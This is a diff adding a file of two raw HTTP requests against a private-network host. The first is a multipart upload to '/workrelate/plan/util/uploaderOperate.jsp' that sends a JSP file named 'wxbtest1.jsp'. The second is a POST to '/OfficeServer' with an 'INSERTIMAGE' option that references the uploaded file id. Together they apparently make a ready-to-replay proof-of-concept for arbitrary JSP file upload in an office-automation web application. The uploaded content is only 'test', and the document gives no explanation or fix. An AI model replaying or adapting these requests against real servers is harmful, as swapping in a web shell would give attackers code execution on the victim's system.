@@ -1,0 +1,44 @@
+POST /workrelate/plan/util/uploaderOperate.jsp HTTP/1.1
+Connection: close
+Accept: */*
+Accept-Encoding: gzip, deflate
+Host: 10.128.154.164
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.47
+Content-Length: 337
+Content-Type: multipart/form-data;boundary=44d3e4be5e5751d3c0e578e61826e9b2
+
+--44d3e4be5e5751d3c0e578e61826e9b2
+Content-Disposition: form-data; name="secId"
+
+1
+--44d3e4be5e5751d3c0e578e61826e9b2
+Content-Disposition: form-data; name="Filedata"; filename="wxbtest1.jsp"
+
+test
+
+--44d3e4be5e5751d3c0e578e61826e9b2
+Content-Disposition: form-data; name="plandetailid"
+
+1
+--44d3e4be5e5751d3c0e578e61826e9b2--
+
+
+
+
+
+
+POST /OfficeServer HTTP/1.1
+Connection: close
+Accept: */*
+Accept-Encoding: gzip, deflate
+Host: 10.128.154.164
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.47
+Content-Length: 191
+Content-Type: multipart/form-data;boundary=44d3e4be5e5751d3c0e578e61826e9b2
+
+--44d3e4be5e5751d3c0e578e61826e9b2
+Content-Disposition: form-data; name="aaa"
+
+{'OPTION':'INSERTIMAGE','isInsertImageNew':'1','imagefileid4pic':'873'}
+
+--44d3e4be5e5751d3c0e578e61826e9b2
